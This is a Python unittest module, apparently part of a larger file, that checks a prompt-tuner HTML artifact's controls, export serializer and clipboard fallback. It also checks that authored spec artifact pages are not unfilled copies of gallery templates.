    if header is None or any(not _carried(header, element) for element in ATTRIBUTION_ELEMENTS):
        failures.append(f"{PROMPT_TUNER_LABEL}: incomplete upstream attribution header")
    elif _labelled_value(header, UPSTREAM_FILE_LABEL) != PROMPT_TUNER_SOURCE_FILE:
        failures.append(f"{PROMPT_TUNER_LABEL}: attribution must name {PROMPT_TUNER_SOURCE_FILE}")

    elements = _elements(text)
    attributes = [dict(element.attributes) for element in elements]
    by_id = {attrs.get("id"): (element.tag, attrs) for element, attrs in zip(elements, attributes) if attrs.get("id")}
    required_ids = ("prompt-template", "prompt-slots", "prompt-samples", "preview-status", "reset-prompt", "copy-markdown", "copy-status", "copy-fallback")
    failures.extend(f"{PROMPT_TUNER_LABEL}: missing named control or region #{item}" for item in required_ids if item not in by_id)
    slot_controls = [attrs for attrs in attributes if attrs.get("data-slot-field") == "name"]
    samples = [attrs for attrs in attributes if attrs.get("data-sample-id") is not None]
    previews = [attrs for attrs in attributes if attrs.get("data-preview") is not None]
    if len(slot_controls) < 5 or any(not attrs.get("aria-label") for attrs in slot_controls):
        failures.append(f"{PROMPT_TUNER_LABEL}: expected at least five labeled slot controls")
    if len(samples) < 3 or len(previews) < 3 or any(not attrs.get("aria-labelledby") for attrs in samples):
        failures.append(f"{PROMPT_TUNER_LABEL}: expected three named sample and preview regions")
    for literal in ("No prompt template text.", "No prompt slots.", "No prompt samples.", "Invalid slot; preview keeps the unresolved token.", "Duplicate slot identifier.", 'role="status"', 'aria-live="polite"'):
        if literal not in text:
            failures.append(f"{PROMPT_TUNER_LABEL}: missing visible state/status contract {literal!r}")
    if text.count(">Copy as Markdown<") != 1:
        failures.append(f"{PROMPT_TUNER_LABEL}: expected exactly one control labeled Copy as Markdown")
    for token in ("sessionstorage", "indexeddb", "urlsearchparams", "execcommand(", "download="):
        if token in authored.casefold():
            failures.append(f"{PROMPT_TUNER_LABEL}: producer uses prohibited state/export token {token!r}")
    widths = [int(value) for value in re.findall(r"@media[^{}]*max-width\s*:\s*(\d+)px", text, re.IGNORECASE)]
    if not any(width >= 360 for width in widths) or "prefers-reduced-motion" not in text or ":focus-visible" not in text:
        failures.append(f"{PROMPT_TUNER_LABEL}: responsive, reduced-motion, or visible-focus handling is missing")
    return failures


def check_w2(gallery_root: Path) -> list[str]:
    """W2 - one fresh snapshot emits the exact ordered prompt schema."""
    artifact = _artifact_path(gallery_root, PROMPT_TUNER_ID)
    if artifact is None or not artifact.is_file():
        return [f"{PROMPT_TUNER_LABEL}: missing producer artifact"]
    text = _document_text(artifact)
    failures: list[str] = []
    for name, expected in (("ROOT_FIELDS", _PROMPT_ROOT_FIELDS), ("SAMPLE_FIELDS", _PROMPT_SAMPLE_FIELDS), ("ISSUE_FIELDS", _ISSUE_FIELDS)):
        if _javascript_array(text, name) != expected:
            failures.append(f"{PROMPT_TUNER_LABEL}: {name} must declare exact deterministic order {expected!r}")
    required = (
        "captureSnapshot", "serializePrompt", "normalizeSlot", "renderPreviews", "collectIssues",
        "# Prompt Tuner Export", "Artifact: prompt-tuner", "Export kind: markdown",
        "artifact-gallery.prompt-tuner.export.v1", 'JSON.stringify(snapshot, null, 2)',
        'schemaVersion: "artifact-gallery.prompt-tuner.export.v1"', 'artifactId: "prompt-tuner"',
        "duplicate_identifier", "invalid_value", "unavailable_value", "rawValue", "normalizedValue",
        "Required value is empty.", "Value is invalid and was not normalized.",
        "A normalized value is unavailable.", "Identifier duplicates the first visible occurrence.",
        "const snapshot = captureSnapshot();", "const markdown = serializePrompt(snapshot);",
        "firstSlotOccurrence", "firstSampleOccurrence", "distinctSlots", "preview",
        "const fields = Object.create(null);",
    )
    failures.extend(f"{PROMPT_TUNER_LABEL}: missing serializer contract {token!r}" for token in required if token not in text)
    if "cachedMarkdown" in text or text.count("const markdown = serializePrompt(snapshot);") != 1:
        failures.append(f"{PROMPT_TUNER_LABEL}: export must serialize one fresh snapshot exactly once per invocation")
    if 'String.fromCharCode(96).repeat(3)' not in text or 'FENCE + "json"' not in text:
        failures.append(f"{PROMPT_TUNER_LABEL}: export must contain exactly one explicit JSON fence")
    return failures


def check_w3(gallery_root: Path) -> list[str]:
    """W3 - clipboard recovery is current-invocation and zero/one-attempt."""
    artifact = _artifact_path(gallery_root, PROMPT_TUNER_ID)
    if artifact is None or not artifact.is_file():
        return [f"{PROMPT_TUNER_LABEL}: missing producer artifact"]
    text = _document_text(artifact)
    failures: list[str] = []
    required = (
        "let copyAttempt = 0;", "const attempt = ++copyAttempt;", "clearCopyState();",
        "const clipboard = navigator.clipboard;", 'typeof clipboard.writeText !== "function"',
        "await clipboard.writeText(markdown);", "showFallback(markdown);",
        "Copied. Markdown is on the clipboard.",
        "Copy failed. The Markdown export is available below for manual copy.",
        "fallback.hidden = false;", "fallback.value = markdown;", "fallback.focus();", "fallback.select();",
    )
    failures.extend(f"{PROMPT_TUNER_LABEL}: missing clipboard state hook {token!r}" for token in required if token not in text)
    if text.count("clipboard.writeText(markdown)") != 1:
        failures.append(f"{PROMPT_TUNER_LABEL}: current invocation must call writeText at most once")
    if text.count("attempt !== copyAttempt") < 2:
        failures.append(f"{PROMPT_TUNER_LABEL}: both superseded settlement directions need currency guards")
    if text.casefold().count("execcommand(") or "download=" in text.casefold():
        failures.append(f"{PROMPT_TUNER_LABEL}: hidden copying and download recovery are prohibited")
    return failures


class PromptTunerProducerTests(unittest.TestCase):
    def test_prompt_tuner_editing_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_w1(GALLERY_ROOT), [])

    def test_prompt_tuner_serializer_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_w2(GALLERY_ROOT), [])

    def test_prompt_tuner_clipboard_contract_passes_against_the_shipped_gallery(self) -> None:
        self.assertEqual(check_w3(GALLERY_ROOT), [])


# ---------------------------------------------------------------------------
# Group X - authored spec artifacts are filled, not shipped templates
# ---------------------------------------------------------------------------

SPECS_ROOT = REPO_ROOT / "specs"
SPEC_ARTIFACT_GLOB = "*/artifacts/*.html"
SAMPLE_NOTICE_CLASSES = ("sample-notice", "notice", "note")
"""Every class the shipped corpus uses to mark its "this is a sample" banner.

Three names, not one, because the templates were ported at different times and
never converged: ``sample-notice`` in code-approaches, flowchart,
implementation-plan and module-map; ``notice`` in spec-explainer; ``note`` in
annotated-diff and pr-writeup. Naming only the first would leave sixteen of the
twenty templates uncovered, spec-explainer among them, which is one of the pages
the original defect shipped unfilled.

The remaining thirteen templates carry no banner at all. There, byte-identity in
``check_x1`` is the only guard, and one byte of drift defeats it. That is a
stated limit of the assertion rather than a gap to close here: closing it would
mean fingerprinting template prose, which goes stale on every template edit.
"""


def _spec_artifacts(specs_root: Path) -> list[Path]:
    """Every authored spec artifact page; an absent specs root is zero files.

    Zero artifacts is a pass, not a failure. Specs are archived out of this tree
    once they merge, so a repository state carrying no ``specs/*/artifacts/`` at
    all is ordinary and must not turn this group red.

    This walks the working tree rather than asking git what is committed, since
    no check in this file shells out and the standard library offers nothing
    better. The consequence is recorded rather than left to read as an oversight:
    on a clean checkout the working tree *is* the committed tree, so the sweep
    equals the assertion the group states; run locally it additionally reaches an
    artifact that is not committed yet, which catches the drift one step earlier.
    """
    if not specs_root.is_dir():
        return []
    return sorted(path for path in specs_root.glob(SPEC_ARTIFACT_GLOB) if path.is_file())


def _spec_artifact_label(specs_root: Path, path: Path) -> str:
    """A repository-relative label, so a failure names a path a reader can open."""
    return f"{specs_root.name}/{path.relative_to(specs_root).as_posix()}"


def check_x1(gallery_root: Path, specs_root: Path = SPECS_ROOT) -> list[str]:
    """X1 - no authored spec artifact is byte-identical to its shipped template.

    The gallery templates ship as complete worked examples rather than blank
    scaffolds, so a page copied out and never filled renders as a finished
    document about a fictional feature. Every "is each region populated?" check
    passes on that page, which is why this comparison has to be positive: the
    only reliable evidence the author did the work is that the bytes moved.

    A basename with no template under ``templates/`` is not a failure. Gallery
    entries come and go, and an artifact matching none of them is out of scope
    rather than wrong.
    """
    templates_root = gallery_root / TEMPLATES_DIR
    failures: list[str] = []
    for path in _spec_artifacts(specs_root):
        template = templates_root / path.name
        if not template.is_file():
            continue
        if path.read_bytes() == template.read_bytes():
            failures.append(
                f"{_spec_artifact_label(specs_root, path)}: byte-identical to "
                f"{TEMPLATES_DIR}/{path.name} — the shipped template was committed unfilled, so the page "
                "documents the template's sample feature rather than this spec"
            )
    return failures


def _banner_text(document: str) -> str | None:
    """The page's sample-banner text, flattened, or ``None`` when it has none."""
    for class_name in SAMPLE_NOTICE_CLASSES:
        match = re.search(
            rf'<([a-z]+)\b[^>]*class="[^"]*\b{re.escape(class_name)}\b[^"]*"[^>]*>(.*?)</\1>',
            document,
            re.S,
        )
        if match:
            return " ".join(re.sub(r"<[^>]+>", " ", match.group(2)).split())
    return None


def check_x2(gallery_root: Path, specs_root: Path = SPECS_ROOT) -> list[str]:
    """X2 - no authored spec artifact keeps its template's sample banner.

    The test is the banner's *text*, not its class. Class alone cannot decide
    this: the filled spec-explainer page legitimately keeps ``class="notice"``
    for a scope note of its own, so a check that failed on the class would fail
    a correct page. Comparing the flattened banner text against the same
    template's banner separates the two exactly — a filled page has written its
    own words there, and an unfilled one still carries the template's.

    Both roots are read, so ``gallery_root`` is genuinely used here. The banner
    is located by matching the element rather than the raw document, because a
    filled artifact keeps the template's ``.sample-notice`` CSS rule inside
    ``<style>`` after removing the paragraph that used it, and a substring scan
    would report a page that is in fact correct.
    """
    failures: list[str] = []
    templates = gallery_root / TEMPLATES_DIR
    for path in _spec_artifacts(specs_root):
        template = templates / path.name
        if not template.is_file():
            continue
        template_banner = _banner_text(_document_text(template))
        if template_banner is None:
            continue
        if _banner_text(_document_text(path)) == template_banner:
            failures.append(
                f"{_spec_artifact_label(specs_root, path)}: keeps the banner text from "
                f"{TEMPLATES_DIR}/{path.name} verbatim — the template's own line saying the page "
                "is a worked example, which a filled page replaces with its own words"
            )
    return failures


GROUP_X_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (("X1", check_x1), ("X2", check_x2))


class SpecArtifactFillTests(unittest.TestCase):
    """Group X against the committed specs tree."""

    def test_group_x_passes_against_the_committed_spec_artifacts(self) -> None:
        for name, check in GROUP_X_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT, SPECS_ROOT), [])


# --- Group X fixtures ------------------------------------------------------


class SpecArtifactFillFixtureCase(GalleryFixtureCase):
    """A synthetic templates directory and specs tree, both under the temp root.

    Nothing is written into the repository: the real specs tree holds four filled
    artifacts today and is empty again once this spec archives, so every way the
    group can fail is exercised here instead.
    """

    template_name = "module-map.html"
    template_text = (
        "<!doctype html>\n<title>NIMBUS-101 Offline Draft Sync</title>\n"
        '<style>.sample-notice { color: red; }</style>\n'
        '<p class="sample-notice">This page is a sample.</p>\n'
    )

    def setUp(self) -> None:
        super().setUp()
        self.write(f"{TEMPLATES_DIR}/{self.template_name}", self.template_text)
        self.specs = self.gallery / "specs"

    def write_artifact(self, text: str, *, spec: str = "some-feature", name: str | None = None) -> Path:
        path = self.specs / spec / "artifacts" / (name or self.template_name)
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open("w", encoding="utf-8", newline="") as handle:
            handle.write(text)
        return path

    @property
    def filled_text(self) -> str:
        return (
            "<!doctype html>\n<title>Some Feature Module Map</title>\n"
            '<style>.sample-notice { color: red; }</style>\n<p>The real module map.</p>\n'
        )


class SpecArtifactFillFixtureTests(SpecArtifactFillFixtureCase):
    """X1 and X2 against synthetic specs trees built in a temporary directory."""

    def test_a_filled_artifact_passes(self) -> None:
        self.write_artifact(self.filled_text)

        self.assertEqual(check_x1(self.gallery, self.specs), [])
        self.assertEqual(check_x2(self.gallery, self.specs), [])

    def test_x1_rejects_an_artifact_byte_identical_to_its_template(self) -> None:
        self.write_artifact(self.template_text)

        self.assertReports(check_x1(self.gallery, self.specs), self.template_name, "byte-identical")

    def test_x1_accepts_an_artifact_differing_by_a_single_byte(self) -> None:
        """Non-vacuity in the other direction: X1 compares bytes, not shape."""
        self.write_artifact(self.template_text.replace("NIMBUS-101", "NIMBUS-102"))

        self.assertEqual(check_x1(self.gallery, self.specs), [])

    def test_x2_rejects_an_artifact_carrying_the_sample_notice_element(self) -> None:
        self.write_artifact(self.template_text.replace("NIMBUS-101", "NIMBUS-102"))

        self.assertReports(check_x2(self.gallery, self.specs), self.template_name, "banner text")

    def test_x2_reads_the_element_rather_than_the_stylesheet(self) -> None:
        """A filled artifact keeps the template's ``.sample-notice`` CSS rule."""
        filled = self.filled_text
        self.assertIn(".sample-notice", filled)

        self.write_artifact(filled)

        self.assertEqual(check_x2(self.gallery, self.specs), [])

    def test_x2_reads_a_multi_class_attribute(self) -> None:
        self.write_artifact(self.template_text.replace('"sample-notice"', '"callout sample-notice"'))

        self.assertReports(check_x2(self.gallery, self.specs), self.template_name, "banner text")

    def test_an_artifact_with_no_matching_template_is_out_of_scope(self) -> None:
        self.write_artifact(self.template_text, name="not-a-gallery-entry.html")

        self.assertEqual(check_x1(self.gallery, self.specs), [])

    def test_an_absent_specs_root_passes(self) -> None:
        self.assertFalse(self.specs.exists())

        self.assertEqual(check_x1(self.gallery, self.specs), [])
        self.assertEqual(check_x2(self.gallery, self.specs), [])


class CheckSignatureTests(unittest.TestCase):
    """Enforce the rule the rest of this module depends on.

    Every ``check_*`` takes the gallery root as its first parameter rather than
    closing over a module constant. That is not a style preference: this feature
    ships zero artifacts, so the groups that inspect an artifact are vacuous
    against the real gallery and are only exercised by building a synthetic
    gallery under a temporary directory and passing its root in. A check that
    reads a module constant instead cannot be pointed at a fixture, and its whole
    group silently degrades to asserting nothing.

    The rule was previously stated in prose only, and prose does not survive nine
    more check groups being written by different hands.
    """

    def test_every_check_takes_gallery_root_first(self) -> None:
        checks = sorted(
            name
            for name, value in globals().items()
            if name.startswith("check_") and callable(value)
        )
        self.assertTrue(checks, "no check_* functions found — the rule would pass vacuously")
        offenders = []
        for name in checks:
            params = list(inspect.signature(globals()[name]).parameters)
            positional = [p for p in params if p != "self"]
            if not positional or positional[0] != "gallery_root":
                offenders.append(f"{name}({', '.join(params) or ''})")
        self.assertEqual(
            [],
            offenders,
            "these checks do not take gallery_root first, so they cannot be run "
            f"against a synthetic fixture and their group is vacuous: {offenders}",
        )


# Registered check-group cases, in contract order. Each group's task appends its
# own case here; a case not named here is a case the suite never runs.
CHECK_GROUPS: tuple[type[unittest.TestCase], ...] = (
    CheckSignatureTests,
    MarkerBlockDriftTests,
    MarkerBlockDriftFixtureTests,
    SharedBlockAccessibilityTests,
    SharedBlockAccessibilityFixtureTests,
    CatalogShapeTests,
    CatalogShapeFixtureTests,
    TriggerClosureTests,
    TriggerClosureFixtureTests,
    ArtifactExistenceTests,
    ArtifactExistenceFixtureTests,
    ExternalReferenceTests,
    ExternalReferenceFixtureTests,
    ProhibitedConstructTests,
    ProhibitedConstructFixtureTests,
    UpstreamAttributionTests,
    UpstreamAttributionFixtureTests,
    PayloadReachTests,
    PayloadReachFixtureTests,
    SuiteRegistrationTests,
    SuiteRegistrationFixtureTests,
    CanonicalBlockAgreementTests,
    CanonicalBlockAgreementFixtureTests,
    SlideDeckReaderTests,
    ConceptExplainerReaderTests,
    StatusReportReaderTests,
    IncidentReportReaderTests,
    TriageBoardProducerTests,
    FeatureFlagsProducerTests,
    PromptTunerProducerTests,
    KeyboardScrollGuardTests,
    KeyboardScrollGuardFixtureTests,
    ReadOnlyPortContractTests,
    ReadOnlyPortContractFixtureTests,
    DecisionPortContractTests,
    DecisionPortContractFixtureTests,
    DecisionExportContractTests,
    DecisionExportContractFixtureTests,
    DecisionAccessibilityContractTests,
    SpecArtifactFillTests,
    SpecArtifactFillFixtureTests,
)


def build_suite() -> unittest.TestSuite:
    suite = unittest.TestSuite()
    for test_case in CHECK_GROUPS:
        suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(test_case))
    return suite


def main() -> int:
    # Sweeps whatever specs exist rather than depending on a named one, so
    # it is archive-safe by construction: an absent feature folder
    # contributes nothing. See install_specs_read_guard.
    return run_counted(
        build_suite(), label="test-artifact-gallery", allow_live_specs=True
    )


if __name__ == "__main__":
    raise SystemExit(main())
